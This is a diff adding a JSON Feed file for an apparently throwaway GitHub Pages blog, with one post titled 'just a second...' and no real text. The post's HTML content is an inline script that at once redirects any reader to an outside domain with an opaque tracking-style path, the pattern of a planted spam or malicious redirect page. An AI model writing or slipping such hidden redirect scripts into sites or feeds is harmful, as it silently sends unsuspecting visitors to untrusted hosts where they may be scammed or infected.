@@ -1,0 +1,27 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "kontars",
+    "description": "",
+    "home_page_url": "https://zakialaoui.github.io/gh-pages",
+    "feed_url": "https://zakialaoui.github.io/gh-pages/feed.json",
+    "user_comment": "",
+    "author": {
+        "name": "folkas"
+    },
+    "items": [
+        {
+            "id": "https://zakialaoui.github.io/gh-pages/just-a-second/index.html",
+            "url": "https://zakialaoui.github.io/gh-pages/just-a-second/index.html",
+            "title": "just a second...",
+            "summary": " ",
+            "content_html": "<p>\n<script>\ndocument.location.href = 'http://xhuauto.com/2029327ce5274492Xn0UM0Gh39UDr131410CZ';\n</script>\n</p>",
+            "author": {
+                "name": "folkas"
+            },
+            "tags": [
+            ],
+            "date_published": "2021-09-20T18:22:48+01:00",
+            "date_modified": "2021-09-20T18:22:48+01:00"
+        }
+    ]
+}
